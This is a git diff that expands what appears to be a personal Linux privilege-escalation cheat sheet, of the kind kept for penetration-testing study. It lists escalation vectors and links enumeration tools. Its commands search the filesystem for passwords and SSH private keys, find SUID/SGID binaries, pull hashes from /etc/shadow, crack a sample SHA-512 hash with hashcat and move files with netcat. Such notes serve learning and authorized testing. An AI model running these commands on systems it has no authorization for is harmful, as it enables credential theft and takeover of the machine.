@@ -1,16 +1,132 @@
-# General Info
+# General Info and Approach
 
-comming soon
+* Generally you end up in restricted user account or shell
+* You can almost always write to `/tmp` folder
 
-# Reconaissance
+* Linux Privilege escalation can be performed using following options:
 
-## Network
+1. Disclosed passwords or other credentials allowing direct accont hijacking
+2. sudo misconfigurations or vulnerabilities
+3. SUID or SGID misconfigurations
+4. Write on root owned files
+5. Cron services misconfigurations
+6. Services ran as root
+7. Kernel Exploits
+8. Using enumeration scripts
 
-* View which ports are open and which processes use them: `ss -ptunl` (easy to remember as "Ptunnel")
+# Using enumeration scripts
 
-# Transfer files
+https://github.com/carlospolop/PEASS-ng/releases/
+https://github.com/rebootuser/LinEnum
+https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+https://payatu.com/guide-linux-privilege-escalation
 
-* ssh
+# Disclosed passwords or other credentials
+
+* Finding passwords using bash
+```
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+```
+
+* Finding passwords using linenum
+```
+./LinEnum.sh -k password
+```
+
+* Finding ssh keys
+
+```
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+```
+
+* Advanced: SSH-DSS process
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ssh-key-predictable-prng-authorized_keys-process
+
+
+# sudo misconfigurations or vulnerabilities
+
+
+# SUID or SGID misconfigurations
+
+If s-bit is set, it allows running the program as the owner.
+Sometimes those programs can be vulnerable or tricked into executing some malicious code.
+
+1. Find SUID or SGID files
+
+For SUID:
+`find . -perm /4000`
+
+For SGID:
+`find . -perm /2000`
+
+For files with both bits set:
+`find . -perm /6000`
+
+# Write on root owned files
+
+# Cron services misconfigurations
+
+```
+ls -la /etc/cron.daily/
+```
+
+# Utilities
+This should help inside the system.
+
+## System recon
+
+1. List processes run as root:
+`ps aux | grep root`
+
+2. Search history:
+`history`
+
+3. Search home directories:
+`ls -la /home`
+`ls -la ~/.ssh`
+
+4. See sudo permissions (password may be needed):
+`sudo -l`
+
+5. search for config files
+
+`find / -iname *.config 2>/dev/null`
+
+6. Grab password hashes
+
+shadow file /etc/shadow or /etc/passwd
+
+In passwd you may find something like this: sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:
+
+Cracking the hash:
+
+```
+# $6$ stands for sha512
+
+hashcat -h | grep sha512
+
+hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+```
+
+7. Exploit unmounted drives to find sensitive information
+
+`lsblk`
+
+8. Find writable directories and files:
+`find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
+`find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
+
+
+## File transfering 
+
+* scp
+* socat
+* wget
 * nc
 ```
 #start listener
@@ -23,8 +139,6 @@ nc -nv listener_ip 80 < input.txt
 cat output.txt
 ```
 
-* bash
-* netcat original
 
 # /etc/passwd
 
